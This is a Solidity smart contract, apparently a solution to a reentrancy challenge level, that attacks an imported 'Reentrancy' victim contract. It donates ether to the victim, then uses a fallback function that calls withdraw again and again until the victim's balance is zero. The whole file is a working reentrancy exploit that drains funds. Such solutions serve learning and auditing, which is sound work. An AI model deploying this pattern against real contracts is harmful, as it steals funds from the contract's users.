// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../Reentrancy.sol';

contract ReentrancyExploit {

    Reentrancy public victimContract;
    uint public amount;

    constructor(address payable _victimContractAddr) {
        victimContract = Reentrancy(_victimContractAddr);
    }

    function donateToVictim() public payable {
        amount = msg.value;
        victimContract.donate{ value: amount }(address(this));
    }

    fallback() external payable {
        if(address(victimContract).balance != 0) {
            victimContract.withdraw(amount);
        } 
    }
}
